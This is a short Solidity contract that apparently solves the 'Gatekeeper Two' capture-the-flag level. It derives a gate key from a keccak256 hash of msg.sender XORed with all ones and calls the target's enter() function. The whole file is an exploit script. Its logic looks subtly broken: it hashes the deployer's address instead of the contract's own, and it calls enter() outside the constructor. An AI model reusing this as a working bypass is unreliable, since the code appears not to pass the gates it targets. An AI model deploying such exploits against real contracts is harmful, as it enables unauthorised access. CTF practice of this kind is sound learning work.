// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface GatekeeperTwoInterface {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttack {
    GatekeeperTwoInterface gatekeeperTwo;
    bytes8 public key;

    constructor(address _gatekeeperTwoAddress) {
        gatekeeperTwo = GatekeeperTwoInterface(_gatekeeperTwoAddress);
        key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(msg.sender))))) ^ ~uint64(0));
    }

    function attack() public {
        gatekeeperTwo.enter(key);
    }
}
